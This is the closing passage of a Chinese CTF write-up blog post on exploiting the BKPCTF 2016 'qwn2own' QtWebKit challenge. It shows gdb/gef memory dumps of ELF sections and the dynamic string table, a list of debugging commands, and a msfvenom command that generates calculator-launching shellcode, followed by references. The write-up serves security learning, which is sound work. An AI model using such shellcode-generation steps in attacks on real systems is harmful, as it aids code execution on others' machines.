0x55a2cd01a33c</span><br><span class="line">.gnu.version_r &#x3D; 0x55a2cd01a4f0</span><br><span class="line">.rela.dyn &#x3D; 0x55a2cd01a580</span><br><span class="line">.init &#x3D; 0x55a2cd01c2c0</span><br><span class="line">.plt &#x3D; 0x55a2cd01c2e0</span><br><span class="line">.plt.got &#x3D; 0x55a2cd01c2f0</span><br><span class="line">.text &#x3D; 0x55a2cd01c730</span><br><span class="line">.fini &#x3D; 0x55a2cd023aa4</span><br><span class="line">.rodata &#x3D; 0x55a2cd023ac0</span><br><span class="line">.eh_frame_hdr &#x3D; 0x55a2cd024898</span><br><span class="line">.eh_frame &#x3D; 0x55a2cd024c70</span><br><span class="line">.gcc_except_table &#x3D; 0x55a2cd026584</span><br><span class="line">.init_array &#x3D; 0x55a2cd227320</span><br><span class="line">.fini_array &#x3D; 0x55a2cd227330</span><br><span class="line">.jcr &#x3D; 0x55a2cd227338</span><br><span class="line">.data.rel.ro &#x3D; 0x55a2cd227340</span><br><span class="line">.dynamic &#x3D; 0x55a2cd227910</span><br><span class="line">.got &#x3D; 0x55a2cd227b50</span><br><span class="line">.data &#x3D; 0x55a2cd228000</span><br><span class="line">.bss &#x3D; 0x55a2cd228028</span><br></pre></td></tr></table></figure>
<p>查看dynamic段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;40 0x55a2cd227910</span><br><span class="line">0x55a2cd227910:	0x0000000000000001	0x0000000000000001</span><br><span class="line">0x55a2cd227920:	0x0000000000000001	0x0000000000000ea7</span><br><span class="line">略</span><br><span class="line">0x55a2cd227a10:	0x0000000000000005 &lt;--d_tag&#x3D;5	0x000055a2cd018738 &lt;--STRTAB</span><br><span class="line">0x55a2cd227a20:	0x0000000000000006&lt;--d_tag&#x3D;6 	0x000055a2cd0172e0 &lt;--SYMTAB</span><br><span class="line">0x55a2cd227a30:	0x000000000000000a	0x0000000000001c03</span><br><span class="line">0x55a2cd227a40:	0x000000000000000b	0x0000000000000018</span><br></pre></td></tr></table></figure>
<p>查看STRTAB</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20s  0x000055a2cd018738</span><br><span class="line">0x55a2cd018738:	&quot;&quot;</span><br><span class="line">0x55a2cd018739:	&quot;libQt5WebKitWidgets.so.5&quot;</span><br><span class="line">0x55a2cd018752:	&quot;__gmon_start__&quot;</span><br><span class="line">0x55a2cd018761:	&quot;_ITM_deregisterTMCloneTable&quot;</span><br><span class="line">0x55a2cd01877d:	&quot;_ITM_registerTMCloneTable&quot;</span><br><span class="line">0x55a2cd018797:	&quot;_Jv_RegisterClasses&quot;</span><br><span class="line">0x55a2cd0187ab:	&quot;_ZNK11QObjectData17dynamicMetaObjectEv&quot;</span><br><span class="line">0x55a2cd0187d2:	&quot;_ZN7QObject7connectEPKS_PKcS1_S3_N2Qt14ConnectionTypeE&quot;</span><br><span class="line">0x55a2cd018809:	&quot;_ZN11QMetaObject10ConnectionD1Ev&quot;</span><br><span class="line">0x55a2cd01882a:	&quot;_ZN4QUrlC1Ev&quot;</span><br><span class="line">0x55a2cd018837:	&quot;_ZN10QArrayData11shared_nullE&quot;</span><br><span class="line">0x55a2cd018855:	&quot;_ZN10QArrayData10deallocateEPS_mm&quot;</span><br></pre></td></tr></table></figure>




<p><strong>调试的新姿势整理</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb命令</span><br><span class="line">at PID 附加到进程 </span><br><span class="line">elfheader 获取ELF的header信息</span><br><span class="line">查看进程内存</span><br><span class="line">cat &#x2F;proc&#x2F;&#96;pidof qwn2own&#96;&#x2F;maps</span><br><span class="line">查看二进制</span><br><span class="line">Xxd</span><br><span class="line">msf生成shellcode（弹计算器shell加DISPLAY）</span><br><span class="line">msf5 &gt; msfvenom -p linux&#x2F;x64&#x2F;exec CMD&#x3D;&#39;DISPLAY&#x3D;:0 gnome-calculator&#39; -f c&gt; shellcode</span><br></pre></td></tr></table></figure>




<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p><a target="_blank" rel="noopener" href="https://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16">https://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16</a></p>
<p><a target="_blank" rel="noopener" href="http://v4kst1z.top/2019/01/25/qwn2own/#more">http://v4kst1z.top/2019/01/25/qwn2own/#more</a></p>
<p><a target="_blank" rel="noopener" href="http://rk700.github.io/2015/04/09/dt_debug-read/">http://rk700.github.io/2015/04/09/dt_debug-read/</a> </p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Migraine殇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://migraine-sudo.github.io/2019/12/20/qwn2own/">https://migraine-sudo.github.io/2019/12/20/qwn2own/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://migraine-sudo.github.io" target="_blank">Migraine殇</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a></div><div class="post_share"><div class="social-share" data-image="/img/MYzR3f.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/12/21/Shellcode-Write/"><img class="prev-cover" src="/img/9tBe6z.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一步步编写Shellcode</div></div></a></div><div class="next-post pull-right"><a href="/2019/12/01/CVE-2012-1876/"><img class="next-cover" src="/img/XsPKP4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">IE堆漏洞利用（CVE-2012-1876）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/09/22/19宿迁/" title="19江苏省省赛-宿迁"><img class="cover" src="https://s2.ax1x.com/2019/09/21/nxCsat.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-22</div><div class="title">19江苏省省赛-宿迁</div></div></a></div><div><a href="/2019/10/26/Gusubei/" title="从东南到东南 --姑苏杯信安大赛小记"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/3mxaVq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-26</div><div class="title">从东南到东南 --姑苏杯信安大赛小记</div></div></a></div><div><a href="/2019/11/12/Three-Write/" title="红帽杯PWN题-Three 解析"><img class="cover" src="/img/5WTH0f.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-12</div><div class="title">红帽杯PWN题-Three 解析</div></div></a></div><div><a href="/2019/07/21/phpunserialize/" title="PHP反序列化漏洞"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/xSxH1Q.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-07-21</div><div class="title">PHP反序列化漏洞</div></div></a></div><div><a href="/2019/12/25/AFL-FUZZ/" title="AFL_FUZZ"><img class="cover" src="/img/eBQfnI.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-25</div><div class="title">AFL_FUZZ</div></div></a></div><div><a href="/2019/06/02/19信安/" title="2019全国大学生信息安全大赛线下初体验   --体验黑客的儿童节"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/jaMKKy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-06-02</div><div class="title">2019全国大学生信息安全大赛线下初体验   --体验黑客的儿童节</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Migraine殇</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/migraine-sudo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/migraine-sudo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2576361468@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://twitter.com/0xp0kerface" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎光临寒舍，右下角可以设置夜间模式</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0.前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">1.漏洞代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9E%84%E9%80%A0Exploit"><span class="toc-number">3.</span> <span class="toc-text">2.构造Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="toc-number">3.1.</span> <span class="toc-text">2.1实现任意地址读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">2.2利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JITPage%E5%86%99Shellcode"><span class="toc-number">3.2.1.</span> <span class="toc-text">JITPage写Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80%EF%BC%88%E7%95%99%E5%9D%91%EF%BC%89"><span class="toc-number">3.2.2.</span> <span class="toc-text">泄漏地址（留坑）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">参考文献：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2099/12/14/Diary/" title="Diary"><img src="/img/IMG_7932.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Diary"/></a><div class="content"><a class="title" href="/2099/12/14/Diary/" title="Diary">Diary</a><time datetime="2099-12-13T16:01:36.000Z" title="发表于 2099-12-14 00:01:36">2099-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/30/nexus5/" title="Nexus5折腾小记"><img src="https://img-blog.csdnimg.cn/img_convert/182eb0788d06c05a6c26308aaa0150a1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nexus5折腾小记"/></a><div class="content"><a class="title" href="/2022/07/30/nexus5/" title="Nexus5折腾小记">Nexus5折腾小记</a><time datetime="2022-07-30T15:54:15.000Z" title="发表于 2022-07-30 23:54:15">2022-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光"><img src="https://z3.ax1x.com/2021/07/17/W13xu4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="留给这不长不短的时光"/></a><div class="content"><a class="title" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光">留给这不长不短的时光</a><time datetime="2021-07-12T15:53:34.000Z" title="发表于 2021-07-12 23:53:34">2021-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165"><img src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QEMU:CVE-2015-5165"/></a><div class="content"><a class="title" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165">QEMU:CVE-2015-5165</a><time datetime="2021-04-02T07:52:34.000Z" title="发表于 2021-04-02 15:52:34">2021-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）"><img src="/img/7GdBdp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mips 漏洞入门与分析（CVE-2020-8423）"/></a><div class="content"><a class="title" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）">Mips 漏洞入门与分析（CVE-2020-8423）</a><time datetime="2021-01-29T17:50:25.000Z" title="发表于 2021-01-30 01:50:25">2021-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Migraine殇</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>